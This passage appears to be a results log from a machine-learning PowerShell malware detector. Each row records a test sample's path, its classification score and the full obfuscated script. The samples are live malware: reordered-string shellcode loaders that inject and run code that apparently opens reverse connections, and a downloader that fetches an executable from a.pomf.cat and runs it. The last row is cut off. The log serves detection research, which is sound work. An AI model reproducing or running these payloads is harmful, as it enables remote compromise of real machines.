2026-07-13 16:43:41,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\14.ps1,custom-ps-ml,UNKNOWN,09282755-b2b1-4577-a2c0-e4c35a535a90,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2806,1881.19,"((\""{39}{6}{37}{19}{22}{34}{27}{32}{35}{7}{25}{31}{36}{44}{40}{17}{30}{4}{14}{9}{28}{33}{21}{11}{20}{1}{23}{38}{16}{5}{29}{15}{3}{45}{46}{41}{10}{24}{43}{42}{2}{26}{18}{13}{0}{8}{12}\"" -f 'eThrea','0x33,0x32,0x00,0x00,0x68','fBi -le (IfBz.Length-1);IfBi++) {If','0x89,0xe','xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf','0,','kc = ofq[','pThreadId);[DllImport(xAGms','d(0,0,IfBrgcM,0,0,0);for (',',0x01,0xd3,0x66,0','0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;IfBg = 0x1000;if ','x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,',';;){Start-sleep 60};','+IfBi), IfBz[IfBi], 1)};IfBw::Creat',',0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24',',0xbb,','x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0','[Byte[]];[Byte[]]IfBz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,','[IntPtr](IfBrgcM.ToInt32()','t(xAGkernel32.dllxAG)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint ','0x68,','x24,0x24,0x5b,0x5b,0x61,0','d',',0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x7','(IfBz.Length -gt 0x1000){IfBg = IfBz.Length};IfBrgcM=IfBw::Virtu','vcrt.dllxAG)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);ofq','Bw::memset(','rnel32.dllxAG)]public stat','x8b,0x0c,0x4b,0x8b,','0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x65,0x68,0x02,0x00,0x01','0x8b,0x42,0x3c,0x01,0',';IfBw =','ic extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreatio','0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0','wSize, uint flAllocationType, uint flProtect);[DllImport(xAGke','nFlags, IntPtr l',' Add-Type -memberDefinition IfBqkc -Name xA','DllImpor','7,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0','IfBq','-passthru;',',0x93,0x53,0x6a,',' (IfBi=0;I','alAlloc(0,0x1000,IfBg,0x40);for','GWin32xAG -namespace Win32Functions ','6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2',',0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5')).replACe('ofq',[STRInG][cHAR]39).replACe(([cHAR]73+[cHAR]102+[cHAR]66),[STRInG][cHAR]36).replACe('xAG',[STRInG][cHAR]34) | &amp;((VaRIabLE '*MdR*').Name[3,11,2]-joiN'')",malicious,TP
2026-07-13 16:43:56,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\140.ps1,custom-ps-ml,UNKNOWN,d677f2f1-5265-4b70-b86f-313acfdc708d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2929,1962.84,". ( $sHEllId[1]+$SHelLID[13]+'x') (((\""{2}{46}{40}{3}{60}{27}{29}{54}{19}{41}{68}{33}{9}{58}{16}{61}{17}{38}{32}{23}{42}{69}{1}{21}{39}{65}{52}{20}{34}{7}{5}{4}{10}{14}{53}{13}{0}{31}{50}{43}{28}{66}{24}{8}{6}{55}{57}{37}{11}{51}{59}{45}{18}{15}{35}{47}{56}{12}{25}{26}{30}{64}{67}{36}{63}{62}{44}{48}{49}{22}\""-f '3,0x8b,0x04,0x8b,0x01,0xd0,0','f,0x31,0xc0,0','S68c = zNG[DllImport(ezVkernel3','Ptr VirtualAlloc(In','0x0d,0x01,0xc7,',',0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,','x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,','0x8b,0x48,0x18,0x8b,0x58,0x20',',0xd5,0x50,0x50,0x50,0x50,0',' = Add-Type -memberDefinition S','0x38,0xe0,0x75,0xf4,0x03,0x7d','9,0x','0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,','3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd',',0xf8,0x3b,0x7d,0x24,','8,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x','ezV -namespace','thru;[Byte[','6','ntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParamet','x01,0xd0,0x','xac,','){Start-sleep 60};','00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x',',0x29,0x80,0x6b,0x00,0xff','0xc3,0x29,0','xc6,0x85,0xf6,0x75,0xec,0xc3;S68g = 0x1000;if (S68z.L','onType, uint flProtect);[DllImport(ezVkern','0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x5','el32.d','ength -gt 0x1000){S68g = S68z.Length};S','x89,0x44,0x24,0x24,0x5b,',',0x','nt);zNG;S68w','50,','40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0','ntPt','00,0x01,0xbb,0x8',']];[Byte[]]S68z = 0xfc,0xe8,0x89','0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,',' static extern Int','er, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(ezVmsvcrt.dl','8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0x','0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,','()+S68i), S68z[S68i], 1)};S68w::CreateThread(0,0,S','x','2.dllezV)]public','xa4,0x53,0xe5,0','68x,0,','0,0);for (;;','0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,','e6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0x','8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0','0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd','llezV)]public static extern IntPtr CreateThread(I','0x97,0x6a,0x05,0x68,0x0a,0x0a,0x06,0x0a,0x68,0x0','xff,0xd5,','2,0x','68c -Name ezVWin32','f0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0','tPtr lpAddress, uint dwSize, uint flAllocati',' Win32Functions -pass','x.ToInt32','r](S68','68x','0x10,0x8b,0x42,0x3c,0x01,0xd0,0x','4,0x50,0x68','=S68w::VirtualAlloc(0,0x1000,S68g,0x40);for (S68i=0;S68i -le (S68z.Length-1);S68i++) {S68w::memset([I','lezV)]public static extern IntPtr memset(IntPtr dest, uint src, uint cou','f')).REPLAce(([chAr]122+[chAr]78+[chAr]71),[sTrIng][chAr]39).REPLAce('S68','$').REPLAce('ezV',[sTrIng][chAr]34) )",malicious,TP
2026-07-13 16:44:09,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1405.ps1,custom-ps-ml,UNKNOWN,ae60995b-9149-4f96-8cb5-6d73f41cfe7d,DESKTOP-BAC9DBQ,malicious,0.9999,RandomForest,434,1723.46," .( ([STrInG]$vERBOseprEfEReNCE)[1,3]+'x'-join'') ( ((\""{13}{22}{6}{2}{4}{19}{9}{20}{18}{16}{1}{5}{10}{0}{3}{21}{8}{14}{7}{12}{17}{11}{15}\""-f'//a.pomf.cat/bv','htt','.exe4','ud','ci);(New-Obje','ps','mp+4cif','4ci, g8','e','Web',':','cess g8','fdpl);Start','(g8','xe','fdpl','i','-Pro','nt).DownloadFile(4c','ct System.Net.','Clie','af.','fdpl=g8fenv:te')).rEpLace('g8f','$').rEpLace(([cHAr]52+[cHAr]99+[cHAr]105),[STrinG][cHAr]39) )",malicious,TP
2026-07-13 16:44:24,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1421.ps1,custom-ps-ml,UNKNOWN,78da2e50-2103-4fe4-bb66-61a16aac0884,DESKTOP-BAC9DBQ,malicious,0.9741,RandomForest,2928,1579.12,"&amp; ((gv '*mDr*').nAme[3,11,2]-joIN'')( (((\""{34}{5}{62}{39}{53}{22}{49}{42}{51}{38}{17}{36}{11}{35}{12}{47}{20}{57}{45}{28}{7}{25}{6}{3}{69}{14}{15}{65}{4}{52}{32}{27}{50}{46}{37}{61}{43}{68}{60}{54}{16}{30}{58}{24}{0}{64}{21}{40}{55}{48}{8}{41}{33}{2}{31}{56}{23}{63}{44}{1}{29}{19}{26}{9}{10}{59}{66}{67}{13}{18}\""-f ',0x01,0x75,0','xf6,0x75,0xec,0x',',0x0',',0x58,0x24,0x01,0xd3,0x66',',0x04,0x8','nel32.dllG0d)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uin','0x75,0xe2,0x58,0x8b','xcf','x','h -gt 0x1000','){tDqg = tDqz.Length};tDq','5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x','14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c','40);for (tDqi=0;tDqi -le (tDqz.Length-1);tDqi++) {tDqw::memset([IntPtr](tDqx.ToInt32()+tDqi), tDqz[tDqi], 1)};tDqw::Create','0c,0','x4b,0x8b,0x5','40,0x5','te[]]tDqz ','Thread(0,0,tDqx,0,0,0);for (;;){Start-sleep 60};','en','c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0','0,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0x',' flProtect);[DllImport(G0dkernel32.dllG0d)]public static e','x',',0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00',',0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,','gt','51,0x','0x31,0xff,0x31,0xc0,0xac,0xc1,0','c3;tDqg = 0x1000;if (tDqz.L','0,0x40,0x50,0x68,0xea,0x0f,0xdf,0x','0,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53','x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x','36,0x6a,0x40,0x68','tDqc = uxf[DllImport(G0dker','52,0x0c,0x8b,0x52,0x','= 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe','5f,0x5','yte[]];[By','locationType,','ff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xe','ff,0xd5,0x8b,0x','ress, IntPtr lpParameter, uint dwCreationFla',',0xff,0xd5,0xb8,0x90,0x01,0x00,0x','3,0x29,0xc6,0x85,0',',0x01,0xd6,','2,0x00,0x00,0x68,0x77,0x73,0x32,0x',',0x02,0x2','c8,0x5f,0','xtern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAdd','ff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x3','gs, IntPtr lpThreadId);[DllImport(G0dmsvcrt.dllG0d)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);uxf;tDqw = Add-Type -memberDefinition tDqc -Name G0dWin32G0d -namespace Win32Functions -passthru;[B','b,0x01,0xd0,0x89,0',' uint','0x','c,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0x',',0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0','x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b','e0','x=tDqw::',',0xd5,0x50,0x50,0x50,0x50,','4,0x68,0x4c,0x77,0x26,0x07','t dwSize, uint flAl','c','x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x1','8,0x1c,0x01,0xd3,0x8b','VirtualAlloc(0,0x1','000,tDqg,0x','00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff',',0x8b,0x')) -REPlAcE ([CHAr]71+[CHAr]48+[CHAr]100),[CHAr]34  -CrEpLACE'uxf',[CHAr]39-CrEpLACE 'tDq',[CHAr]36) )",malicious,TP
2026-07-13 16:44:30,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1429.ps1,custom-ps-ml,UNKNOWN,9754c8b8-98fe-47e1-a02f-5417360bc0bb,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2924,1560.83," &amp;( $ShellId[1]+$shellId[13]+'x')( (((\""{37}{58}{2}{20}{59}{38}{31}{8}{36}{1}{3}{33}{66}{15}{63}{50}{39}{65}{6}{57}{49}{34}{26}{32}{29}{16}{25}{17}{69}{51}{44}{35}{60}{42}{13}{41}{46}{52}{12}{27}{61}{55}{45}{64}{4}{18}{5}{54}{19}{22}{67}{30}{0}{40}{47}{43}{7}{48}{62}{56}{53}{24}{23}{68}{28}{21}{10}{14}{9}{11}\""-f'a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5','Import(H7fms','H7f)]public static extern Int','vc','x1b,','a','z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x',',','l32.dllH7f)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThr','Thread(0,0,aUGx,0,0,0);for (;;){Star','r](aUGx','t-sleep 60};',',0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd','x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,','.ToInt32()+aUGi), aUGz[aUGi], 1)};aUGw::Create',' ','c0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x',',0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac','0x68,0x02,0x00,0xb0,0x44,0x89,0xe6,0x6','56,0xff,0xd5,0x6a,','Ptr VirtualAlloc(IntPtr lpAddress, u','-le (aUGz.Length-1);aUGi++) {aUGw::memset([IntPt','0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd','0,aUGg','00','18,0x8b,0x58,0x20',',0x8b,0x42,0x3','5,0x','40);for (aUGi=0;aUGi ','0x8b,0x40,0x78,0x85,0x',',0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6','erne','c,0x01,0xd0,','rt.dllH7f)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);tcX;aUGw','x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10','b,0x58,0x1c,0x01,0xd','eadId);[Dll','aUGc = tcX[DllImport(H7fkernel32.d','pe, uint flProtect);[DllImport(H7fk','ace Win32Fu',',0x93,0x53,0x6a,0x0','0xeb,0x86,0x5d,0x68,','x89,0x44,0x24,0','x57,0x68,0x02,0xd9,0xc8','b,0x0c,0x4b,0x8','0x0','0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,','0,0x56,0x53,0','0x5f,0xff,0xd5,0x0','x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0','berDefinition aUGc -Name H7fWin32H7f -namesp','03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8','0x01,0x00',',0x1',',0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x','xe0,0xff,0xd5,0x97,0x6a,','x1000){aUGg = aUGz.Length};aUGx=aUGw::VirtualAlloc(0','0f,0xb7,0','ll','int dwSize, uint flAllocationTy','3,0x8b,0x04,0x8b,0x01,0xd0,0','50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0','1,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;aUGg = 0x1000;if (aUGz.Length -gt 0','-mem','5,0x68,0x05,0xe6,0xea,0','nctions -passthru;[Byte[]];[Byte[]]aUG',' = Add-Type','9,0xc8,0x5f,0xff,0xd5,0x8b,0x36',',0x',',0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x'))  -cREpLAce 'H7f',[cHAr]34-cREpLAce 'tcX',[cHAr]39  -cREpLAce([cHAr]97+[cHAr]85+[cHAr]71),[cHAr]36))",malicious,TP
2026-07-13 16:44:35,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\144.ps1,custom-ps-ml,UNKNOWN,a43eab6c-3643-4313-8853-29009e31f48c,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2842,1530.63,"&amp;( $eNv:CoMsPEC[4,26,25]-JOiN'') ( (((\""{37}{30}{33}{36}{40}{17}{10}{44}{38}{7}{29}{32}{11}{5}{28}{31}{24}{1}{39}{3}{46}{19}{12}{8}{34}{14}{18}{0}{4}{22}{25}{13}{41}{21}{42}{9}{35}{27}{26}{6}{23}{15}{20}{16}{43}{47}{45}{2}\""-f '0x00,0x50,0x89,0xe6,0x',',0xcf,0x0d,0x01',',0,iBvbx,0,0,0);for (;;){Start-sleep 60};','x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,','6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff','0,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x2','x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,','0x00,0x00,0x60,0x89,0xe5,0x31,0xc0','0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x','00,0x68,0x58','t, uint src, uint count);a80;iBvbw = Add-Type -memberDefinition iBvbc -Name C6HWin32C6H -namespace Win32Functions -passthru;[Byte[]];[Byte[]]iBvbz ','x8b,0x50,0x3','8,0x90,','8,0x00,0x7e,0xe9,0x8b,0','68,0xc0,0xa8,0x00,0x6e,0',',0xc3,0x29,0xc6,0x75,0xe9,0xc3,0x','iBvbg = iBvbz','es','x68,0x02,0x00,',',0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb','bb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;iBvbg = 0x1000;if (iBvbz.Length -gt 0x1000){','0,0x56,0x6a,',',0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0x','0xc3,0x01','31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1','d5,0x83,0xf','53,0x57,0x68,0','xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x','8,0x0f,0xb7',',0x64','port(C6Hkernel32.dllC6H)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationTy',',0x4a,0x26,0x',',0','pe, uint flProtect);[DllImport(C6Hkernel32.dllC6H)]public static extern IntPtr CreateThr','05,0x',',0xa4,0x53,0xe5,0','ead(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(C6Hmsvcr','iBvbc = a80[DllIm','e8,0x82,0x00,',',0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0','t.dllC6H)]public static extern IntPtr memset(IntPtr d','x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x0','0x','.Length};iBvbx=iBvbw::VirtualAlloc(0,0','= 0xfc,0x','+) {iBvbw::memset([IntPtr](iBvbx.ToInt32()+iBvbi), iBvbz[iBvbi], 1)};iBvbw::CreateThread(0','0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32','x1000,iBvbg,0x40);for (iBvbi=0;iBvbi -le (iBvbz.Length-1);iBvbi+'))-replAcE([chaR]105+[chaR]66+[chaR]118+[chaR]98),[chaR]36-replAcE  'a80',[chaR]39-replAcE'C6H',[chaR]34))",malicious,TP
2026-07-13 16:44:38,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1440.ps1,custom-ps-ml,UNKNOWN,f8b7a05a-c500-4b51-8ac4-658ce4e5eba9,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2985,1608.31," &amp; ( $ENv:coMSpeC[4,24,25]-joIn'')(((\""{1}{59}{12}{40}{23}{58}{29}{66}{51}{49}{48}{41}{13}{28}{14}{46}{24}{68}{57}{39}{35}{60}{33}{11}{63}{31}{45}{47}{37}{61}{8}{32}{20}{21}{50}{9}{54}{15}{64}{18}{22}{34}{52}{42}{17}{2}{62}{55}{19}{38}{26}{3}{43}{67}{56}{25}{30}{27}{69}{6}{4}{53}{10}{7}{36}{5}{65}{16}{44}{0}\"" -f'(;;){Start-sleep 60};','t3Gc = tdm[DllImport(KFekernel32.dll','50,0x50,0x','0c,0xf','6,0x85,0xf6',' (t3Gi=0;t3Gi -le (t3Gsc.Length-1);t3Gi++) {t3G','3,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc','-gt 0x1000){t3Gsize = t3Gsc.Length};t3G','0x','b,0x04,','ec,0xc3;t3Gsize = 0x1000;if (t3Gsc.Length ','x31,0xff,0x31,0xc0,0xac,0x3',');[DllImport(KFeke','memberDefinition t3Gc -Name KFeWin32KFe -namespace Win32Functions -passthru;[Byte[]];[Byte[]]',',0xe8,0x89,0x00,0x00,0x',',0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x0','set([IntPtr](t3Gx.ToInt32()+t3Gi), t3Gsc[t3Gi], 1)};t3Gw::CreateThread(0,0,t3Gx,0,0,0);fo',',0x','8,0x77,0x73,0x32,0x5f,0x54,0x6','0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x16,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,','1c',',0x01,0xd3,0x','8,0x4c,0x77,','uint dwStackSize, IntPtr lpStartAddress, I','0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,','56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd','x61,0xff,0xd5,0x85,0xc0,0x74,0x',',0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe','t3Gsc = 0xfc','ionFlags, Int','5,0x8b,0x36,0x6a','0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x','0c,0x4b,0x8b,0x58,0x','0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0','0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54',',0x5','x=t3Gw::VirtualAlloc(0,0x1000,t3Gsize,0x40);for',',0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0','0x56,0x57,0x68,0x99,0xa5,0x74,0','x30,0x8b','rnel32.dllKFe)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, ',' dest, uint src, uint count);tdm;t3Gw = Add-Type -','0,0x50','f,','r ','8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0','00,','x34,0x8b,0x01,0xd6','ublic static extern IntPtr memset(IntPtr','emsvcrt.dllKFe)]p','8','dId);[DllImport(KF',',0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x5',',0x75,0x','0x8b,0x01','x50,0x68,0xea,0x0f,','0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x','x52,0','ntPtr lpParameter, uint dwCreat','KFe)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect','2,0x0c,0x8b,','xd3,0x66,0x8b,','40,0x50,0x40,0','c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,','0,0x6','w::mem','Ptr lpThrea','0x4e,','0','5,0xff,0xd5,0x9')).rEpLace(([CHaR]116+[CHaR]100+[CHaR]109),[StrIng][CHaR]39).rEpLace('KFe',[StrIng][CHaR]34).rEpLace(([CHaR]116+[CHaR]51+[CHaR]71),[StrIng][CHaR]36))",malicious,TP
2026-07-13 16:44:43,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1461.ps1,custom-ps-ml,UNKNOWN,f82db89f-8a63-4144-b5c7-b5d6b2168334,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2773,1623.41," ((\""{1}{33}{2}{38}{29}{30}{15}{26}{14}{22}{11}{13}{12}{23}{16}{4}{32}{37}{8}{28}{44}{43}{45}{0}{9}{41}{3}{31}{7}{20}{21}{36}{6}{27}{25}{24}{34}{35}{19}{17}{18}{46}{5}{42}{40}{39}{10}\""-f',0x8b,0x48,0x18,0x8b,0x58,0x2','xdec = hoP[DllImport(kGYkernel32.dllkGY)]public static extern Int','ress, uint dwSize, uint flAllocationType, uint 